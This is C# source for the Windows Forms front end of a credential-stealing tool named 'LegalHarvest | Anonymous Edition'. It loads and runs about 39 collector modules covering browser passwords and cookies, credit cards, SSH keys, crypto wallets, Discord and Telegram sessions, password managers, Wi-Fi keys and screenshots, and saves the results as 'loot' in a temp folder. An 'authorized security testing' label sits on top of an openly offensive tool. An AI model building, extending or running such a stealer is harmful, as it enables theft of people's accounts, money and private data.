using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using LegalHarvest.Modules;
using Newtonsoft.Json;

namespace LegalHarvest
{
    public class RedTigerStyleForm : Form
    {
        private CheckedListBox chkModules;
        private Button btnLaunch;
        private RichTextBox txtLogs;
        private Label lblStatus;
        private Button btnOpenFolder;
        private Panel headerPanel;
        private Label lblTitle;
        private Timer glitchTimer;
        private int glitchOffset = 0;

        private List<ICollectorModule> allModules;
        private string outputDir;

        public RedTigerStyleForm()
        {
            Text = "LegalHarvest | Anonymous Edition";
            Size = new Size(800, 650);
            StartPosition = FormStartPosition.CenterScreen;
            FormBorderStyle = FormBorderStyle.None;
            BackColor = Color.FromArgb(10, 5, 20);
            ForeColor = Color.FromArgb(200, 100, 255);

            InitializeComponents();
            LoadModules();
            StartGlitchEffect();
        }

        private void InitializeComponents()
        {
            // Barre de titre
            headerPanel = new Panel
            {
                Location = new Point(0, 0),
                Size = new Size(800, 80),
                BackColor = Color.FromArgb(15, 0, 30)
            };
            headerPanel.Paint += HeaderPanel_Paint;
            Controls.Add(headerPanel);

            Button btnClose = new Button
            {
                Text = "✕",
                Location = new Point(760, 10),
                Size = new Size(30, 30),
                FlatStyle = FlatStyle.Flat,
                ForeColor = Color.FromArgb(180, 80, 255),
                Font = new Font("Consolas", 14, FontStyle.Bold)
            };
            btnClose.Click += (s, e) => Environment.Exit(0);
            btnClose.FlatAppearance.BorderSize = 0;
            headerPanel.Controls.Add(btnClose);

            lblTitle = new Label
            {
                Text = "🐺 ANONYMOUS EDITION",
                Location = new Point(20, 20),
                Size = new Size(450, 40),
                Font = new Font("Consolas", 20, FontStyle.Bold),
                ForeColor = Color.FromArgb(180, 60, 255)
            };
            headerPanel.Controls.Add(lblTitle);

            // Panel modules
            Panel modulePanel = new Panel
            {
                Location = new Point(15, 95),
                Size = new Size(380, 400),
                BackColor = Color.FromArgb(15, 5, 25),
                BorderStyle = BorderStyle.FixedSingle
            };
            modulePanel.Paint += (s, e) =>
            {
                ControlPaint.DrawBorder(e.Graphics, modulePanel.ClientRectangle,
                    Color.FromArgb(100, 30, 180), ButtonBorderStyle.Solid);
            };
            Controls.Add(modulePanel);

            Label lblModules = new Label
            {
                Text = "🎯 TARGETS",
                Location = new Point(10, 10),
                Size = new Size(360, 20),
                ForeColor = Color.FromArgb(200, 100, 255),
                Font = new Font("Consolas", 11, FontStyle.Bold)
            };
            modulePanel.Controls.Add(lblModules);

            chkModules = new CheckedListBox
            {
                Location = new Point(10, 35),
                Size = new Size(360, 320),
                BackColor = Color.FromArgb(8, 3, 18),
                ForeColor = Color.FromArgb(180, 130, 255),
                Font = new Font("Consolas", 9),
                BorderStyle = BorderStyle.None,
                CheckOnClick = true
            };
            modulePanel.Controls.Add(chkModules);

            Button btnSelectAll = new Button
            {
                Text = "ALL",
                Location = new Point(10, 360),
                Size = new Size(175, 30),
                BackColor = Color.FromArgb(40, 10, 80),
                ForeColor = Color.FromArgb(200, 100, 255),
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Consolas", 9, FontStyle.Bold)
            };
            btnSelectAll.Click += (s, e) => { for (int i = 0; i < chkModules.Items.Count; i++) chkModules.SetItemChecked(i, true); };
            modulePanel.Controls.Add(btnSelectAll);

            Button btnDeselectAll = new Button
            {
                Text = "NONE",
                Location = new Point(195, 360),
                Size = new Size(175, 30),
                BackColor = Color.FromArgb(15, 5, 25),
                ForeColor = Color.FromArgb(100, 80, 150),
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Consolas", 9, FontStyle.Bold)
            };
            btnDeselectAll.Click += (s, e) => { for (int i = 0; i < chkModules.Items.Count; i++) chkModules.SetItemChecked(i, false); };
            modulePanel.Controls.Add(btnDeselectAll);

            // Bouton EXECUTE
            btnLaunch = new Button
            {
                Text = "⚡ EXECUTE ⚡",
                Location = new Point(420, 95),
                Size = new Size(360, 50),
                BackColor = Color.FromArgb(60, 15, 120),
                ForeColor = Color.FromArgb(220, 150, 255),
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Consolas", 14, FontStyle.Bold)
            };
            btnLaunch.Click += BtnLaunch_Click;
            Controls.Add(btnLaunch);

            lblStatus = new Label
            {
                Text = "[ STANDBY ]",
                Location = new Point(420, 155),
                Size = new Size(360, 20),
                ForeColor = Color.FromArgb(130, 100, 180),
                Font = new Font("Consolas", 9, FontStyle.Bold)
            };
            Controls.Add(lblStatus);

            // Console
            txtLogs = new RichTextBox
            {
                Location = new Point(420, 185),
                Size = new Size(360, 260),
                BackColor = Color.FromArgb(5, 2, 15),
                ForeColor = Color.FromArgb(180, 130, 255),
                Font = new Font("Consolas", 8),
                ReadOnly = true,
                BorderStyle = BorderStyle.None
            };
            Controls.Add(txtLogs);

            btnOpenFolder = new Button
            {
                Text = "📂 OPEN LOOT",
                Location = new Point(420, 460),
                Size = new Size(360, 35),
                BackColor = Color.FromArgb(15, 5, 25),
                ForeColor = Color.FromArgb(200, 100, 255),
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Consolas", 10, FontStyle.Bold),
                Enabled = false
            };
            btnOpenFolder.Click += (s, e) =>
            {
                if (!string.IsNullOrEmpty(outputDir) && Directory.Exists(outputDir))
                    System.Diagnostics.Process.Start(outputDir);
            };
            Controls.Add(btnOpenFolder);

            Label lblWarning = new Label
            {
                Text = "☠ FOR AUTHORIZED SECURITY TESTING ONLY ☠",
                Location = new Point(15, 570),
                Size = new Size(770, 30),
                ForeColor = Color.FromArgb(200, 80, 255),
                TextAlign = ContentAlignment.MiddleCenter,
                Font = new Font("Consolas", 10, FontStyle.Bold)
            };
            Controls.Add(lblWarning);
        }

        private void HeaderPanel_Paint(object sender, PaintEventArgs e)
        {
            LinearGradientBrush brush = new LinearGradientBrush(
                new Point(0, 0), new Point(800, 0),
                Color.FromArgb(20, 0, 50), Color.FromArgb(80, 20, 150));
            e.Graphics.FillRectangle(brush, headerPanel.ClientRectangle);
        }

        private void StartGlitchEffect()
        {
            glitchTimer = new Timer { Interval = 100 };
            glitchTimer.Tick += (s, e) =>
            {
                glitchOffset++;
                if (glitchOffset > 10) glitchOffset = 0;
                lblTitle.Text = glitchOffset % 3 == 0 ? "🐺 ANONYMOUS EDITION _" : "🐺 ANONYMOUS EDITION  ";
            };
            glitchTimer.Start();
        }

        private void LoadModules()
        {
            allModules = new List<ICollectorModule>
            {
                new SystemInfoModule(), new AllChromiumBrowsersPasswordsModule(),
                new AllChromiumBrowsersCookiesModule(), new SocialMediaCookiesModule(),
                new FirefoxPasswordsModule(), new FirefoxCookiesModule(),
                new BrowserHistoryModule(), new CreditCardsModule(),
                new AutofillDataModule(), new WindowsCredentialManagerModule(),
                new ClipboardContentModule(), new InstalledSoftwareModule(),
                new ProcessListModule(), new SensitiveFilesModule(),
                new SSHKeysModule(), new GamingClientsModule(),
                new VPNClientsModule(), new MessagingAppsModule(),
                new DesktopAppSessionsModule(), new CryptoWalletsModule(),
                new CryptoWalletsExtensionsModule(), new DiscordAllTokensModule(),
                new TelegramAllSessionsModule(), new OutlookAccountsModule(),
                new WifiPasswordsModule(), new FtpVpnModule(),
                new ScreenCaptureAllModule(), new HardwareInfoModule(),
                new RecentFilesModule(), new DatabaseClientsModule(),
                new ThunderbirdPasswordsModule(), new PuttySessionsModule(),
                new FileZillaPasswordsModule(), new SavedRDPModule(),
                new NordPassModule(), new KeePassModule(),
                new BitwardenModule(), new AnyDeskModule(),
                new MobaXtermModule()
            };
            foreach (var module in allModules)
                chkModules.Items.Add($"[ {module.ModuleName} ]", true);
        }

        private void BtnLaunch_Click(object sender, EventArgs e)
        {
            btnLaunch.Enabled = false;
            txtLogs.Clear();
            Log("╔══════════════════════════════════════╗", Color.FromArgb(180, 80, 255));
            Log("║   🐺 ANONYMOUS HARVEST ACTIVE 🐺   ║", Color.FromArgb(180, 80, 255));
            Log("╚══════════════════════════════════════╝", Color.FromArgb(180, 80, 255));

            var selectedModules = new List<ICollectorModule>();
            for (int i = 0; i < chkModules.Items.Count; i++)
                if (chkModules.GetItemChecked(i)) selectedModules.Add(allModules[i]);

            if (selectedModules.Count == 0)
            {
                Log("[!] No target selected.", Color.FromArgb(255, 200, 50));
                btnLaunch.Enabled = true;
                return;
            }

            outputDir = Path.Combine(Path.GetTempPath(), $"LegalHarvest_{DateTime.Now:yyyyMMdd_HHmmss}");
            Directory.CreateDirectory(outputDir);
            Log($"[*] Loot folder : {outputDir}", Color.FromArgb(100, 200, 255));

            var allItems = new List<CollectedItem>();
            int total = selectedModules.Count;
            int current = 0;

            new Thread(() =>
            {
                foreach (var module in selectedModules)
                {
                    current++;
                    Invoke((Action)(() => lblStatus.Text = $"[ HARVESTING {current}/{total} ]"));

                    if (!module.CanExecute())
                    {
                        Log($"[~] {module.ModuleName} : SKIPPED", Color.FromArgb(100, 100, 100));
                        continue;
                    }
                    try
                    {
                        var items = module.Collect();
                        if (items != null) { lock (allItems) allItems.AddRange(items); }
                        Log($"[+] {module.ModuleName} : {items?.Count ?? 0} items", Color.FromArgb(150, 200, 100));
                    }
                    catch (Exception ex)
                    {
                        Log($"[-] {module.ModuleName} : {ex.Message}", Color.FromArgb(255, 80, 80));
                    }
                }

                string jsonFile = Path.Combine(outputDir, "harvest.json");
                File.WriteAllText(jsonFile, JsonConvert.SerializeObject(allItems, Formatting.Indented));

                Invoke((Action)(() =>
                {
                    lblStatus.Text = "[ MISSION COMPLETE ]";
                    Log("╔══════════════════════════════════════╗", Color.FromArgb(180, 80, 255));
                    Log($"║   TOTAL LOOT : {allItems.Count} items", Color.FromArgb(180, 80, 255));
                    Log("╚══════════════════════════════════════╝", Color.FromArgb(180, 80, 255));
                    btnOpenFolder.Enabled = true;
                    btnLaunch.Enabled = true;
                }));
            }).Start();
        }

        private void Log(string message, Color color)
        {
            if (txtLogs.InvokeRequired)
            {
                txtLogs.Invoke((Action)(() => Log(message, color)));
                return;
            }
            txtLogs.SelectionStart = txtLogs.TextLength;
            txtLogs.SelectionLength = 0;
            txtLogs.SelectionColor = color;
            txtLogs.AppendText($"{message}{Environment.NewLine}");
            txtLogs.SelectionColor = txtLogs.ForeColor;
            txtLogs.ScrollToCaret();
        }
    }
}
